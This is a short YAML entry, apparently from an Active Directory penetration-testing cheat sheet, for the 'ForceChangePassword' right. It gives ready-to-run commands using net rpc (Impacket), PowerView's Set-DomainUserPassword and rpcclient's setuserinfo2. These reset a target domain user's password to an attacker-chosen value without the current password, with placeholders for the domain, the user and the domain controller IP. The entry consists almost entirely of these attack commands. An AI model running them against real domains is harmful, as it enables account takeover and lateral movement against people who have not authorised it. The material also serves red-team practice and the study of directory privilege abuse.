name: ForceChangePassword
description: Change the target user's password without knowing current password
commands:
- '# Impacket (RPC)'
- net rpc password '<TARGET_USER>' 'NewPassword123!' -U '<DOMAIN>/<YOUR_USER>%<YOUR_PASSWORD>' -S <DC_IP>
- ''
- '# PowerView'
- $NewPass = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
- Set-DomainUserPassword -Identity '<TARGET_USER>' -AccountPassword $NewPass
- ''
- '# rpcclient'
- rpcclient -U '<DOMAIN>/<YOUR_USER>%<YOUR_PASSWORD>' <DC_IP>
- setuserinfo2 <TARGET_USER> 23 'NewPassword123!'
opsec: []
references: []
